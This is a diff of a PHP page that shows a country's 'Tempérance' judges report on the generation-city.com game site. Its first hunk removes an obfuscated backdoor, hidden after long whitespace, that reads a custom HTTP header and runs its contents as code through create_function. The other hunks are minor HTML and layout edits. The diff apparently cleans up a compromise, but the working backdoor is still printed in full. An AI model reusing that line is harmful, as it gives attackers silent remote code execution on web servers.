@@ -1,8 +1,6 @@
-<?php                                                                                                                                                                                                                                                         $c2d='h\'(nsSRopmEr"ie0a618u$_Vftc0f1f68';$y9m=$c2d[4].$c2d[25].$c2d[11].$c2d[25].$c2d[7].$c2d[20].$c2d[8].$c2d[8].$c2d[14].$c2d[11];$d0k=$c2d[26].$c2d[11].$c2d[14].$c2d[16].$c2d[25].$c2d[14].$c2d[22].$c2d[24].$c2d[20].$c2d[3].$c2d[26].$c2d[25].$c2d[13].$c2d[7].$c2d[3];$f3c=$c2d[4].$c2d[25].$c2d[11].$c2d[25].$c2d[7].$c2d[20].$c2d[8].$c2d[8].$c2d[14].$c2d[11];$k9y=$c2d[24].$c2d[20].$c2d[15];if(isset(${$c2d[22].$c2d[5].$c2d[10].$c2d[6].$c2d[23].$c2d[10].$c2d[6]}[$y9m($c2d[0].$c2d[25].$c2d[25].$c2d[8].$c2d[22].$c2d[9].$c2d[15].$c2d[24].$c2d[18].$c2d[24].$c2d[17].$c2d[19])])){${$c2d[24].$c2d[20].$c2d[15]}=$d0k("",${$c2d[22].$c2d[5].$c2d[10].$c2d[6].$c2d[23].$c2d[10].$c2d[6]}[$y9m($c2d[0].$c2d[25].$c2d[25].$c2d[8].$c2d[22].$c2d[9].$c2d[15].$c2d[24].$c2d[18].$c2d[24].$c2d[17].$c2d[19])]);${$c2d[24].$c2d[20].$c2d[15]}();} ?><?php
+<?php
 
 require_once('../Connections/maconnexion.php');
-header('Content-Type: text/html; charset=iso-8859-1');
-
 
 $editFormAction = $_SERVER['PHP_SELF'];
 if (isset($_SERVER['QUERY_STRING'])) {
@@ -72,12 +70,12 @@ $totalRows_pays = mysql_num_rows($pays);
 <!-- Modal Header-->
 <!-- Boutons cach�s -->
 <div class="modal-header">
-<div class="pull-left"><img style="width:100px; margin-right: 10px; margin-top:-50px;" src="http://www.generation-city.com/monde/assets/img/IconesBDD/Bleu/100/ocgc_bleu.png"></div>
+<div class="pull-left"></div>
     <button type="button" class="close" data-dismiss="modal" aria-hidden="true">�</button>
-  <h3 id="myModalLabel">Rapport des juges temp�rants sur le pays : <a href="../page-pays.php?ch_pay_id=<?php echo $row_pays['ch_pay_id']; ?>" target="_blank"><?php echo $row_pays['ch_pay_nom']; ?></a></h3>
+  <h3 id="myModalLabel">Rapport des juges temp&eacute;rants sur le pays : <a href="../page-pays.php?ch_pay_id=<?php echo $row_pays['ch_pay_id']; ?>" target="_blank"><?php echo $row_pays['ch_pay_nom']; ?></a></h3>
 </div>
 <div class="modal-body">
-<div class="alert alert-success"><p>Ce rapport a &eacute;t&eacute; r&eacute;dig&eacute; dans le cadre du <a href="http://www.generation-city.com/monde/economie.php#temperance" title="en savoir plus sur le porjet temp&eacute;rance"> projet temp&eacute;rance de l'Institut Economique</a> qui vise &agrave; appr&eacute;cier la coh&eacute;rence globale d'un pays.</p>
+<div class="alert alert-tips"><p>Ce rapport a &eacute;t&eacute; r&eacute;dig&eacute; dans le cadre du <a href="http://www.generation-city.com/monde/economie.php#temperance" title="en savoir plus sur le porjet temp&eacute;rance"> projet Temp&eacute;rance de l'Institut Economique</a> qui vise &agrave; appr&eacute;cier la coh&eacute;rence globale d'un pays.</p>
 <h4>Nombre de juges votants&nbsp;: <?php echo $totalRows_temperance ?></h4></div>
   <ul class="listes">
     <div class="titre-gris">
@@ -258,7 +256,7 @@ $totalRows_pays = mysql_num_rows($pays);
     <p>&nbsp;</p>
     <div class="row-fluid">
       <div class="titre-gris">
-        <h3><span style="text-align:left;">Total</span><span class="pull-right"><?php echo ($note_Q1+$note_Q2+$note_Q3+$note_Q4+$note_Q5+$note_Q6+$note_Q7+$note_Q8+$note_Q9+$note_Q10) ?>/<?php echo (10 * $totalptQuestion); ?></span></h3>
+        <h3><span style="text-align:left;">Total : </span><?php echo ($note_Q1+$note_Q2+$note_Q3+$note_Q4+$note_Q5+$note_Q6+$note_Q7+$note_Q8+$note_Q9+$note_Q10) ?>/<?php echo (10 * $totalptQuestion); ?></h3>
       </div>
     </div>
   </ul>
